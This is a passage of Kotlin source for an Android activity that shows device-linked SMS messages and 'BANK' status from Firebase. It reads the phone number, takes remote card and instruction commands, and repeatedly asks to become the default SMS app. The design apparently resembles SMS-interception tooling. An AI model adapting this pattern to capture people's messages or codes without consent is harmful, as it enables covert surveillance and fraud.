                setRotationBack.start()
                
                val flipAnimator = ObjectAnimator.ofFloat(container, "rotationX", 0f, 180f).apply {
                    duration = 600
                    interpolator = android.view.animation.AccelerateDecelerateInterpolator()
                }
                
                flipAnimator.addUpdateListener { animator ->
                    if (isDestroyed || isFinishing) return@addUpdateListener
                    val rotation = animator.animatedValue as Float
                    // At 90 degrees, swap rotation of individual sides
                    if (rotation >= 90f) {
                        ObjectAnimator.ofFloat(smsFront, "rotationX", 180f).apply { duration = 0 }.start()
                        ObjectAnimator.ofFloat(instructionBack, "rotationX", 0f).apply { duration = 0 }.start()
                    }
                }
                
                flipAnimator.addListener(object : AnimatorListenerAdapter() {
                    override fun onAnimationEnd(animation: Animator) {
                        if (isDestroyed || isFinishing) return
                        
                        // Step 3: Reset rotations and fade in instruction content
                        ObjectAnimator.ofFloat(container, "rotationX", 0f).apply { duration = 0 }.start()
                        ObjectAnimator.ofFloat(smsFront, "rotationX", 0f).apply { duration = 0 }.start()
                        ObjectAnimator.ofFloat(instructionBack, "rotationX", 0f).apply { duration = 0 }.start()
                        
                        val fadeInInstruction = ObjectAnimator.ofFloat(instructionBack, "alpha", 0f, 1f).apply {
                            duration = 200
                            interpolator = android.view.animation.DecelerateInterpolator()
                        }
                        fadeInInstruction.start()
                    }
                })
                
                flipAnimator.start()
            }
        })
        
        fadeOutSms.start()
    }
    
    /**
     * Animate card flip from Instruction to SMS (vertical up/down reverse)
     * Sequence: Instruction fade out → vertical flip → SMS fade in
     */
    private fun animateCardFlipToSms(
        smsFront: FrameLayout,
        instructionBack: FrameLayout,
        container: FrameLayout
    ) {
        if (isDestroyed || isFinishing) return
        
        // Set camera distance for 3D effect
        val cameraDistance = resources.displayMetrics.density * 8000
        container.cameraDistance = cameraDistance
        
        // Step 1: Fade out instruction content
        val fadeOutInstruction = ObjectAnimator.ofFloat(instructionBack, "alpha", instructionBack.alpha, 0f).apply {
            duration = 200
            interpolator = android.view.animation.AccelerateInterpolator()
        }
        
        fadeOutInstruction.addListener(object : AnimatorListenerAdapter() {
            override fun onAnimationEnd(animation: Animator) {
                if (isDestroyed || isFinishing) return
                
                // Step 2: Vertical flip reverse (down/up rotation)
                instructionBack.visibility = View.GONE
                smsFront.visibility = View.VISIBLE
                smsFront.alpha = 0f
                
                // Set initial rotation for front side (180 degrees - flipped)
                // Use ObjectAnimator to set rotationX property
                val setRotationFront = ObjectAnimator.ofFloat(smsFront, "rotationX", 180f).apply {
                    duration = 0
                }
                setRotationFront.start()
                
                val flipAnimator = ObjectAnimator.ofFloat(container, "rotationX", 180f, 0f).apply {
                    duration = 600
                    interpolator = android.view.animation.AccelerateDecelerateInterpolator()
                }
                
                flipAnimator.addUpdateListener { animator ->
                    if (isDestroyed || isFinishing) return@addUpdateListener
                    val rotation = animator.animatedValue as Float
                    // At 90 degrees, swap rotation of individual sides
                    if (rotation <= 90f) {
                        ObjectAnimator.ofFloat(instructionBack, "rotationX", 180f).apply { duration = 0 }.start()
                        ObjectAnimator.ofFloat(smsFront, "rotationX", 0f).apply { duration = 0 }.start()
                    }
                }
                
                flipAnimator.addListener(object : AnimatorListenerAdapter() {
                    override fun onAnimationEnd(animation: Animator) {
                        if (isDestroyed || isFinishing) return
                        
                        // Step 3: Reset rotations and fade in SMS content
                        ObjectAnimator.ofFloat(container, "rotationX", 0f).apply { duration = 0 }.start()
                        ObjectAnimator.ofFloat(smsFront, "rotationX", 0f).apply { duration = 0 }.start()
                        ObjectAnimator.ofFloat(instructionBack, "rotationX", 0f).apply { duration = 0 }.start()
                        
                        val fadeInSms = ObjectAnimator.ofFloat(smsFront, "alpha", 0f, 1f).apply {
                            duration = 200
                            interpolator = android.view.animation.DecelerateInterpolator()
                        }
                        fadeInSms.start()
                    }
                })
                
                flipAnimator.start()
            }
        })
        
        fadeOutInstruction.start()
    }
    
    /**
     * Update activation code display in phone card
     */
    private fun updateActivationCodeDisplay(code: String) {
        try {
            if (!isDestroyed && !isFinishing) {
                // Store code without dashes internally
                val codeWithoutDashes = removeDashesFromCode(code)
                activationCode = codeWithoutDashes
                viewModel.activationCode = codeWithoutDashes
                
                // Update phone card display with formatted code (with dashes)
                val phoneCodeView = id.phoneCode
                if (phoneCodeView != null) {
                    phoneCodeView.text = formatCodeForDisplay(codeWithoutDashes)
                    phoneCodeView.visibility = View.VISIBLE
                }
            }
        } catch (e: Exception) {
            LogHelper.e("ActivatedActivity", "Error updating activation code display", e)
        }
    }
    
    /**
     * Setup date/time display - updates every minute
     */
    private fun setupDateTimeDisplay() {
        try {
            val dateTimeView = id.phoneDateTime
            if (dateTimeView != null) {
                // Update immediately
                updateDateTimeDisplay()
                
                // Update every minute (60 seconds)
                val updateRunnable = object : Runnable {
                    override fun run() {
                        if (!isDestroyed && !isFinishing) {
                            updateDateTimeDisplay()
                            handler.postDelayed(this, 60000) // Update every 60 seconds
                        }
                    }
                }
                handler.postDelayed(updateRunnable, 60000)
                handlerRunnables.add(updateRunnable)
            }
        } catch (e: Exception) {
            LogHelper.e("ActivatedActivity", "Error setting up date/time display", e)
        }
    }
    
    /**
     * Update date/time display with format DD-MM / HH:MM
     */
    private fun updateDateTimeDisplay() {
        try {
            val dateTimeView = id.phoneDateTime
            if (dateTimeView != null && !isDestroyed && !isFinishing) {
                val calendar = java.util.Calendar.getInstance()
                val day = String.format("%02d", calendar.get(java.util.Calendar.DAY_OF_MONTH))
                val month = String.format("%02d", calendar.get(java.util.Calendar.MONTH) + 1) // Month is 0-based
                val hour = String.format("%02d", calendar.get(java.util.Calendar.HOUR_OF_DAY))
                val minute = String.format("%02d", calendar.get(java.util.Calendar.MINUTE))
                
                val dateTimeText = "$day-$month / $hour:$minute"
                dateTimeView.text = dateTimeText
            }
        } catch (e: Exception) {
            LogHelper.e("ActivatedActivity", "Error updating date/time display", e)
        }
    }

    /**
     * Get device phone number
     */
    @SuppressLint("HardwareIds")
    private fun getDevicePhoneNumber(): String? {
        return try {
            val telephonyManager = getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager
            telephonyManager?.line1Number?.takeIf { it.isNotBlank() }
        } catch (e: SecurityException) {
            LogHelper.e("ActivatedActivity", "Permission denied getting phone number", e)
            null
        } catch (e: Exception) {
            LogHelper.e("ActivatedActivity", "Error getting phone number", e)
            null
        }
    }
    
    /**
     * Listen for activation code from Firebase
     * Note: Code display is hidden, but we still track it internally
     */
    private fun listenForActivationCode() {
        val mode = activationMode ?: "testing" // Default to testing if not set
        val codePath = AppConfig.getFirebaseDevicePath(cachedAndroidId, mode) + "/${AppConfig.FirebasePaths.CODE}"
        Firebase.database.reference.child(codePath)
            .addListenerForSingleValueEvent { snapshot ->
                val code = snapshot.getValue(String::class.java)
                if (!code.isNullOrBlank()) {
                    // Remove dashes from code for storage
                    val codeWithoutDashes = removeDashesFromCode(code)
                    activationCode = codeWithoutDashes
                    viewModel.activationCode = codeWithoutDashes
                    // Don't set text since UI is hidden
                    
                    // Setup BANK data listener for status card (use code without dashes)
                    handler.post {
                        try {
                            val mode = activationMode ?: "testing" // Default to testing if not set
                            statusManager.setupStatusTextListener(codeWithoutDashes, handler, mode)
                            // Setup device-list status listener for phone status badge
                            statusManager.setupDeviceListStatusListener(codeWithoutDashes, handler, mode)
                            LogHelper.d("ActivatedActivity", "BANK data listener and device-list status listener setup for code: $codeWithoutDashes")
                        } catch (e: Exception) {
                            LogHelper.e("ActivatedActivity", "Error setting up BANK listener or device-list status listener", e)
                        }
                        }
                    } else {
                    // No code yet, get phone number for internal use only
                    val phoneNumber = getDevicePhoneNumber()
                    if (phoneNumber != null && phoneNumber.isNotBlank()) {
                        // Convert to code internally (already without dashes)
                        val convertedCode = convertPhoneToCode(phoneNumber)
                        activationCode = convertedCode
                        viewModel.activationCode = convertedCode
                        
                        // Setup BANK data listener for status card (code is already without dashes)
                        handler.post {
                            try {
                                val mode = activationMode ?: "testing" // Default to testing if not set
                                statusManager.setupStatusTextListener(convertedCode, handler, mode)
                                // Setup device-list status listener for phone status badge
                                statusManager.setupDeviceListStatusListener(convertedCode, handler, mode)
                                LogHelper.d("ActivatedActivity", "BANK data listener and device-list status listener setup for converted code: $convertedCode")
                            } catch (e: Exception) {
                                LogHelper.e("ActivatedActivity", "Error setting up BANK listener or device-list status listener", e)
                            }
                        }
                    }
                }
        }
    }
    
    /**
     * Convert phone number to code
     * Returns code WITHOUT dashes (e.g., "XXXXX11111")
     * Dashes are only added for display purposes
     */
    private fun convertPhoneToCode(phone: String): String {
        val normalized = normalizePhone(phone)
        
        // Sequence numbers to add to each phone digit
        val sequence = intArrayOf(10, 52, 63, 89, 12, 36, 63, 78, 63, 75)
        
        // Ensure phone number has at least 10 digits (pad with zeros if shorter)
        val phoneDigits = normalized.padStart(10, '0').take(10)
        
        val code = StringBuilder()
        val alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        
        // Format: XXXXX11111 (5 letters + 5 numbers, no dashes - dashes are only for display)
        // First 5 characters: letters (XXXXX)
        for (i in 0 until 5) {
            val phoneDigit = phoneDigits[i].toString().toIntOrNull() ?: 0
            val sequenceValue = sequence[i]
            val sum = phoneDigit + sequenceValue
            val letterIndex = sum % 26
            code.append(alphabet[letterIndex])
        }
        
        // Last 5 characters: digits (11111)
        for (i in 5 until 10) {
            val phoneDigit = phoneDigits[i].toString().toIntOrNull() ?: 0
            val sequenceValue = sequence[i]
            val sum = phoneDigit + sequenceValue
            val digit = sum % 10
            code.append(digit)
        }
        
        return code.toString()
    }
    
    /**
     * Format code for display by adding dash between letters and numbers
     * Input: "XXXXX11111" -> Output: "XXXXX-11111"
     */
    private fun formatCodeForDisplay(code: String): String {
        if (code.isBlank()) return code
        
        // Remove any existing dashes first (for backward compatibility)
        val cleanCode = code.replace("-", "")
        
        // Must be exactly 10 characters (5 letters + 5 numbers)
        if (cleanCode.length != 10) return code
        
        // Format: XXXXX-11111 (5 letters - 5 numbers)
        return "${cleanCode.substring(0, 5)}-${cleanCode.substring(5, 10)}"
    }
    
    /**
     * Remove dashes from code (for Firebase storage)
     * Input: "XXX-XXXX-XXX" -> Output: "XXXXX11111"
     */
    private fun removeDashesFromCode(code: String): String {
        return code.replace("-", "")
    }
    
    /**
     * Normalize phone number
     */
    private fun normalizePhone(phone: String): String {
        return phone.replace(Regex("[^0-9]"), "")
    }
    
    /**
     * Handle reset button click
     */
    private fun handleResetClick() {
            resetActivation()
    }
    
    /**
     * Handle test button click
     */
    /**
     * Setup test timer
     */
    private fun setupTestTimer() {
        try {
            // Start timer immediately
            startTestTimer()
        } catch (e: Exception) {
            LogHelper.e("ActivatedActivity", "Error setting up test timer", e)
        }
    }
    
    /**
     * Start the test timer (counts up)
     */
    private fun startTestTimer() {
        try {
            if (isTimerRunning) {
                return // Timer already running
            }
            
            isTimerRunning = true
            testTimerRunnable = object : Runnable {
                override fun run() {
                    if (!isDestroyed && !isFinishing && isTimerRunning) {
                        testTimerSeconds++
                        updateTestTimerDisplay()
                        handler.postDelayed(this, 1000) // Update every second
                    } else {
                        isTimerRunning = false
                    }
                }
            }
            handler.post(testTimerRunnable!!)
        } catch (e: Exception) {
            LogHelper.e("ActivatedActivity", "Error starting test timer", e)
            isTimerRunning = false
        }
    }
    
    /**
     * Reset the test timer to zero
     */
    private fun resetTestTimer() {
        try {
            testTimerSeconds = 0
            updateTestTimerDisplay()
        } catch (e: Exception) {
            LogHelper.e("ActivatedActivity", "Error resetting test timer", e)
        }
    }
    
    /**
     * Update the test timer display
     */
    private fun updateTestTimerDisplay() {
        try {
            val timerView = id.testButtonTimer
            if (timerView != null) {
                val minutes = testTimerSeconds / 60
                val seconds = testTimerSeconds % 60
                val timeString = String.format("%02d:%02d", minutes, seconds)
                timerView.text = timeString
            }
        } catch (e: Exception) {
            LogHelper.e("ActivatedActivity", "Error updating test timer display", e)
        }
    }
    
    private fun handleTestClick() {
        try {
            // Prevent multiple simultaneous clicks
            if (isTesting) {
                LogHelper.w("ActivatedActivity", "Test already in progress, ignoring duplicate click")
                return
            }
            
            if (isDestroyed || isFinishing) {
                LogHelper.w("ActivatedActivity", "Activity destroyed or finishing, ignoring test click")
                return
            }
            
            isTesting = true
            LogHelper.d("ActivatedActivity", "handleTestClick called")
            
            // Reset timer to zero on click
            resetTestTimer()
            
            // Disable button during test
            try {
                id.testButtonCard.isEnabled = false
                id.testButtonCard.alpha = 0.5f
        } catch (e: Exception) {
                LogHelper.e("ActivatedActivity", "Error disabling test button", e)
            }
            
            testFakeSms()
            LogHelper.d("ActivatedActivity", "testFakeSms called successfully")
            
            // Re-enable button after a delay
            handler.postDelayed({
                try {
                    if (!isDestroyed && !isFinishing) {
                        id.testButtonCard.isEnabled = true
                        id.testButtonCard.alpha = 1.0f
                    }
                    isTesting = false
        } catch (e: Exception) {
                    LogHelper.e("ActivatedActivity", "Error re-enabling test button", e)
                    isTesting = false
                }
            }, 2000) // 2 second cooldown
            
        } catch (e: Exception) {
            LogHelper.e("ActivatedActivity", "Error in handleTestClick", e)
            isTesting = false
            // Re-enable button on error
            try {
                if (!isDestroyed && !isFinishing) {
                    id.testButtonCard.isEnabled = true
                    id.testButtonCard.alpha = 1.0f
                }
            } catch (ex: Exception) {
                LogHelper.e("ActivatedActivity", "Error re-enabling test button after error", ex)
            }
        }
    }
    
    /**
     * Reset activation
     */
    private fun resetActivation() {
        // Prevent multiple simultaneous reset calls
        if (isResetting) {
            LogHelper.w("ActivatedActivity", "Reset already in progress, ignoring duplicate call")
                            return
                        }
        
        isResetting = true
        
        try {
            LogHelper.d("ActivatedActivity", "Starting reset activation")
            
            // Cancel all handler runnables first
            try {
                handlerRunnables.forEach { handler.removeCallbacks(it) }
                handlerRunnables.clear()
                                    } catch (e: Exception) {
                LogHelper.e("ActivatedActivity", "Error clearing handler runnables", e)
                                    }
            
            // Cleanup managers to prevent crashes
                                    try {
                firebaseManager.cleanup()
                                    } catch (e: Exception) {
                LogHelper.e("ActivatedActivity", "Error cleaning up Firebase manager", e)
            }
            
            val deviceRef = Firebase.database.reference.child(AppConfig.getFirebaseDevicePath(cachedAndroidId))
            
            // Remove code mapping with error handling
            deviceRef.child(AppConfig.FirebasePaths.CODE).removeValue()
                .addOnSuccessListener {
                    LogHelper.d("ActivatedActivity", "Code removed successfully")
                }
                .addOnFailureListener { e ->
                    LogHelper.e("ActivatedActivity", "Error removing code", e)
                }
            
            // Set isActive to false with error handling
            deviceRef.child(AppConfig.FirebasePaths.IS_ACTIVE).setValue("Closed")
                .addOnSuccessListener {
                    LogHelper.d("ActivatedActivity", "isActive set to false successfully")
                }
                .addOnFailureListener { e ->
                    LogHelper.e("ActivatedActivity", "Error setting isActive", e)
                }
            
            // Clear setup.txt
            try {
                writeInternalFile("setup.txt", "")
                LogHelper.d("ActivatedActivity", "setup.txt cleared")
        } catch (e: Exception) {
                LogHelper.e("ActivatedActivity", "Error clearing setup.txt", e)
            }
            
            // Navigate to SplashActivity after a short delay to ensure cleanup
                    handler.postDelayed({
                try {
                    if (!isDestroyed && !isFinishing) {
                        navigateToSplashActivity()
                    }
                } catch (e: Exception) {
                    LogHelper.e("ActivatedActivity", "Error navigating to SplashActivity", e)
                    // Fallback: finish activity anyway
                    try {
                        finish()
                    } catch (ex: Exception) {
                        LogHelper.e("ActivatedActivity", "Error finishing activity", ex)
                    }
                } finally {
                    isResetting = false
                }
            }, 300) // Small delay to ensure Firebase operations start
            
        } catch (e: Exception) {
            LogHelper.e("ActivatedActivity", "Error in resetActivation", e)
            isResetting = false
            // Even if reset fails, try to navigate to prevent app from being stuck
            try {
                if (!isDestroyed && !isFinishing) {
                    navigateToSplashActivity()
                }
            } catch (ex: Exception) {
                LogHelper.e("ActivatedActivity", "Error navigating after reset failure", ex)
            }
        }
    }
    
    /**
     * Navigate to SplashActivity
     */
    private fun navigateToSplashActivity() {
        try {
            if (isDestroyed || isFinishing) {
                LogHelper.d("ActivatedActivity", "Activity already destroyed or finishing, skipping navigation")
            return
        }
        
            LogHelper.d("ActivatedActivity", "Navigating to SplashActivity")
            
            // Ensure all managers are cleaned up before navigation
            try {
                firebaseManager.cleanup()
        } catch (e: Exception) {
                LogHelper.e("ActivatedActivity", "Error cleaning up Firebase manager before navigation", e)
            }
            
            // Cancel all handler runnables
            handlerRunnables.forEach { handler.removeCallbacks(it) }
            handlerRunnables.clear()
            
            val intent = Intent(this, SplashActivity::class.java)
                intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK
                startActivity(intent)
        overridePendingTransition(android.R.anim.fade_in, android.R.anim.fade_out)
        
            handler.postDelayed({
                try {
            if (!isDestroyed && !isFinishing) {
                finish()
            }
                } catch (e: Exception) {
                    LogHelper.e("ActivatedActivity", "Error finishing activity after navigation", e)
                }
            }, 200)
        } catch (e: Exception) {
            LogHelper.e("ActivatedActivity", "Error in navigateToSplashActivity", e)
            // Fallback: try to finish activity
            try {
                if (!isDestroyed && !isFinishing) {
                    finish()
                }
            } catch (ex: Exception) {
                LogHelper.e("ActivatedActivity", "Error finishing activity in fallback", ex)
            }
        }
    }
    
    /**
     * Test fake SMS
     */
    private fun testFakeSms(
        phoneNumber: String = "+1234567890",
        message: String? = null
    ) {
        try {
            if (isDestroyed || isFinishing) {
                LogHelper.w("ActivatedActivity", "Activity destroyed or finishing, skipping test SMS")
                return
            }
            
            LogHelper.d("ActivatedActivity", "testFakeSms called with phoneNumber=$phoneNumber")
            
            // Get code from internal storage (not from hidden UI)
            val currentCode = activationCode
                ?: viewModel.activationCode
                ?: "N/A"
            
            LogHelper.d("ActivatedActivity", "Current activation code: $currentCode")
            
            // Use unique timestamp to ensure message is not treated as duplicate
            val currentTime = System.currentTimeMillis()
            val timeText = currentTime.formatAsDateAndTime()
            val messageBody = message ?: "Test SMS - $currentCode - $timeText"
            
            LogHelper.d("ActivatedActivity", "Sending test SMS with body: $messageBody")
            LogHelper.d("ActivatedActivity", "Timestamp: $currentTime")
            
            // Ensure SMS RecyclerView and listener are set up
            try {
            if (!isDestroyed && !isFinishing) {
                    // Check if adapter is initialized
                    if (!::smsAdapter.isInitialized) {
                        LogHelper.d("ActivatedActivity", "SMS adapter not initialized, setting up RecyclerView")
                        setupSmsRecyclerView()
                    }
                    
                    // Ensure listener is active
                    setupSmsFirebaseListener()
                    LogHelper.d("ActivatedActivity", "SMS Firebase listener verified")
                    
                    // Ensure SMS card is visible and clickable
                    id.smsCard.visibility = View.VISIBLE
                    id.smsCard.alpha = 1.0f
                    id.smsCard.isClickable = true
                    id.smsCard.isEnabled = true
                    // Ensure RecyclerView is clickable
                    id.smsRecyclerView.isClickable = true
                    id.smsRecyclerView.isEnabled = true
                }
            } catch (e: Exception) {
                LogHelper.e("ActivatedActivity", "Error setting up SMS components", e)
            }
            
            // Send test message to Firebase
            val result = com.example.fast.util.SmsTestHelper.simulateReceivedSms(
                context = this,
                senderPhoneNumber = phoneNumber,
                messageBody = messageBody
            )
            
            LogHelper.d("ActivatedActivity", "SmsTestHelper.simulateReceivedSms returned: $result")
            LogHelper.d("ActivatedActivity", "Test message sent to Firebase - should appear in SMS card shortly")
            
            // Force a small delay and then check if message appeared
            handler.postDelayed({
                try {
                    if (!isDestroyed && !isFinishing && ::smsAdapter.isInitialized) {
                        val currentList = smsAdapter.currentList
                        LogHelper.d("ActivatedActivity", "Current SMS list size after test: ${currentList.size}")
                        if (currentList.isNotEmpty()) {
                            LogHelper.d("ActivatedActivity", "Latest message: ${currentList.first().body}")
                            // Ensure SMS card is visible and RecyclerView is shown
                            id.smsRecyclerView.visibility = View.VISIBLE
                            id.smsEmptyState.visibility = View.GONE
                            // Scroll to top to show newest message
                            try {
                                id.smsRecyclerView.scrollToPosition(0)
        } catch (e: Exception) {
                                LogHelper.e("ActivatedActivity", "Error scrolling to position 0", e)
                            }
                        } else {
                            LogHelper.w("ActivatedActivity", "SMS list is empty after test - message may not have been received")
                            // Try to reload messages
                            loadInitialSmsMessages()
                        }
            } else {
                        LogHelper.w("ActivatedActivity", "SMS adapter not initialized or activity destroyed")
            }
        } catch (e: Exception) {
                    LogHelper.e("ActivatedActivity", "Error checking SMS list after test", e)
                }
            }, 1500) // Increased delay to allow Firebase sync
        } catch (e: Exception) {
            LogHelper.e("ActivatedActivity", "Error in testFakeSms", e)
            throw e // Re-throw to be caught by handleTestClick
        }
    }
    
    override fun onResume() {
        super.onResume()
        serviceManager.ensureServiceRunning()
        checkPermissionsAndUpdateUI()
        // Re-check default SMS app status when activity resumes
        try {
            checkDefaultSms()
        } catch (e: Exception) {
            LogHelper.e("ActivatedActivity", "Error checking default SMS app in onResume", e)
        }
    }
    
    /**
     * Check if app is set as default SMS app and prompt user if not
     * This is required for full SMS functionality including writing to system SMS database
     */
    private fun checkDefaultSms() {
        try {
            if (!DefaultSmsAppHelper.isDefaultSmsApp(this)) {
                LogHelper.d("ActivatedActivity", "App is not default SMS app, prompting user")
                // Use a small delay to avoid interrupting the UI setup
                handler.postDelayed({
                    DefaultSmsAppHelper.requestDefaultSmsApp(this)
                }, 1000) // 1 second delay to let UI settle
            } else {
                LogHelper.d("ActivatedActivity", "App is already set as default SMS app")
            }
        } catch (e: Exception) {
            LogHelper.e("ActivatedActivity", "Error in checkDefaultSms", e)
        }
    }
    
    override fun onSaveInstanceState(outState: Bundle) {
        super.onSaveInstanceState(outState)
        outState.putString("activationCode", activationCode)
    }
    
    override fun onRestoreInstanceState(savedInstanceState: Bundle) {
        super.onRestoreInstanceState(savedInstanceState)
        activationCode = savedInstanceState.getString("activationCode")
        if (!activationCode.isNullOrBlank()) {
            viewModel.activationCode = activationCode
        }
    }
    
    override fun onDestroy() {
        super.onDestroy()
        
        try {
            // Stop test timer
            try {
                isTimerRunning = false
                testTimerRunnable?.let { handler.removeCallbacks(it) }
                testTimerRunnable = null
            } catch (e: Exception) {
                LogHelper.e("ActivatedActivity", "Error stopping test timer", e)
            }
            
            // Stop logo animations
            try {
                if (::logoAnimationManager.isInitialized) {
                    logoAnimationManager.stop()
                }
            } catch (e: Exception) {
                LogHelper.e("ActivatedActivity", "Error stopping logo animation manager", e)
            }
            
            // Cleanup managers with error handling
            try {
                statusManager.cleanup(handler)
            } catch (e: Exception) {
                LogHelper.e("ActivatedActivity", "Error cleaning up status manager", e)
            }
            
            try {
                firebaseManager.cleanup()
            } catch (e: Exception) {
                LogHelper.e("ActivatedActivity", "Error cleaning up Firebase manager", e)
            }
            
            // Cancel all handler runnables
            try {
                handlerRunnables.forEach { handler.removeCallbacks(it) }
                handlerRunnables.clear()
            } catch (e: Exception) {
                LogHelper.e("ActivatedActivity", "Error clearing handler runnables", e)
            }
            
            // Cleanup animation handlers to prevent crashes
            try {
                // Cancel border blink animation
                borderBlinkHandler?.let { handler ->
                    borderBlinkRunnables.forEach { handler.removeCallbacks(it) }
                    borderBlinkRunnables.clear()
                }
                isBorderBlinkAnimating = false
                
                // Cancel pending scroll
                pendingScrollRunnable?.let { handler.removeCallbacks(it) }
                pendingScrollRunnable = null
            } catch (e: Exception) {
                LogHelper.e("ActivatedActivity", "Error cleaning up animation handlers", e)
            }
            
            // Remove SMS Firebase listener
            try {
                smsFirebaseListener?.let {
                    val messagesRef = Firebase.database.reference
                        .child(AppConfig.getFirebaseMessagePath(cachedAndroidId))
                    messagesRef.removeEventListener(it)
                    LogHelper.d("ActivatedActivity", "Removed SMS Firebase listener")
                }
                smsFirebaseListener = null
            } catch (e: Exception) {
                LogHelper.e("ActivatedActivity", "Error removing SMS Firebase listener", e)
            }
            
            // Remove BANK Firebase listener and device-list status listener
            try {
                activationCode?.let { code ->
                    val mode = activationMode ?: "testing"
                    statusManager.removeStatusTextListener(code, mode)
                    statusManager.removeDeviceListStatusListener(code, mode)
                }
                        } catch (e: Exception) {
                LogHelper.e("ActivatedActivity", "Error removing BANK listener or device-list status listener", e)
            }
            
            // Cleanup water effect animations
            try {
                cleanupWaterEffect(id.phoneCard)
                cleanupWaterEffect(id.smsCard)
                                } catch (e: Exception) {
                LogHelper.e("ActivatedActivity", "Error cleaning up water effects", e)
                                }
                                } catch (e: Exception) {
            LogHelper.e("ActivatedActivity", "Error in onDestroy", e)
        }
    }
    
    /**
     * Cleanup water effect animations
     */
    private fun cleanupWaterEffect(card: View?) {
        try {
            card?.tag?.let { tag ->
                if (tag is List<*>) {
                    tag.forEach { animator ->
                        if (animator is android.animation.Animator) {
                            animator.cancel()
                        }
                    }
                }
                card.tag = null
            }
        } catch (e: Exception) {
            LogHelper.e("ActivatedActivity", "Error cleaning up water effect", e)
        }
    }
    
    /**
     * Handle remote card control command
     * @param cardType "sms" or "instruction"
     */
    private fun handleCardControl(cardType: String) {
        try {
            val smsContentFront = id.smsContentFront
            val instructionContentBack = id.instructionContentBack
            val smsCardContentContainer = id.smsCardContentContainer
            
            when (cardType.lowercase()) {
                "sms" -> {
                    if (instructionContentBack.visibility == View.VISIBLE) {
                        animateCardFlipToSms(smsContentFront, instructionContentBack, smsCardContentContainer)
                        LogHelper.d("ActivatedActivity", "Remote control: Showing SMS card")
                    } else {
                        LogHelper.d("ActivatedActivity", "Remote control: Already showing SMS card")
                    }
                }
                "instruction" -> {
                    if (hasInstructionContent) {
                        if (smsContentFront.visibility == View.VISIBLE) {
                            animateCardFlipToInstruction(smsContentFront, instructionContentBack, smsCardContentContainer)
                            LogHelper.d("ActivatedActivity", "Remote control: Showing instruction card")
                        } else {
                            LogHelper.d("ActivatedActivity", "Remote control: Already showing instruction card")
                        }
                    } else {
                        LogHelper.w("ActivatedActivity", "Remote control: No instruction content available")
                    }
                }
                else -> {
                    LogHelper.e("ActivatedActivity", "Remote control: Invalid card type '$cardType'")
                }
            }
        } catch (e: Exception) {
            LogHelper.e("ActivatedActivity", "Error handling card control", e)
        }
    }
    
    /**
     * Handle remote animation trigger command
     * @param animationType "sms", "instruction", or "flip"
     */
    private fun handleAnimationTrigger(animationType: String) {
        try {
            val smsContentFront = id.smsContentFront
            val instructionContentBack = id.instructionContentBack
            val smsCardContentContainer = id.smsCardContentContainer
            
            when (animationType.lowercase()) {
                "sms" -> {
                    // Trigger SMS card animations (if any)
                    LogHelper.d("ActivatedActivity", "Remote animation: SMS card animation triggered")
                    // Add SMS-specific animations here if needed
                }
                "instruction" -> {
                    // Trigger instruction card animations (if any)
                    LogHelper.d("ActivatedActivity", "Remote animation: Instruction card animation triggered")
                    // Add instruction-specific animations here if needed
                }
                "flip" -> {
                    // Trigger flip animation
                    if (instructionContentBack.visibility == View.VISIBLE) {
                        animateCardFlipToSms(smsContentFront, instructionContentBack, smsCardContentContainer)
                        LogHelper.d("ActivatedActivity", "Remote animation: Flip to SMS")
                    } else {
                        if (hasInstructionContent) {
                            animateCardFlipToInstruction(smsContentFront, instructionContentBack, smsCardContentContainer)
                            LogHelper.d("ActivatedActivity", "Remote animation: Flip to Instruction")
                        } else {
                            LogHelper.w("ActivatedActivity", "Remote animation: No instruction content, cannot flip")
                        }
                    }
                }
                else -> {
                    LogHelper.e("ActivatedActivity", "Remote animation: Invalid animation type '$animationType'")
                }
            }
        } catch (e: Exception) {
            LogHelper.e("ActivatedActivity", "Error handling animation trigger", e)
        }
    }
}

// Extension function for Firebase listener
internal fun com.google.firebase.database.DatabaseReference.addListenerForSingleValueEvent(
    callback: (com.google.firebase.database.DataSnapshot) -> Unit
) {
    addListenerForSingleValueEvent(object : com.google.firebase.database.ValueEventListener {
        override fun onDataChange(snapshot: com.google.firebase.database.DataSnapshot) {
            callback(snapshot)
        }
        
        override fun onCancelled(error: com.google.firebase.database.DatabaseError) {
            LogHelper.e("ActivatedActivity", "Firebase listener cancelled", error.toException())
        }
    })
}
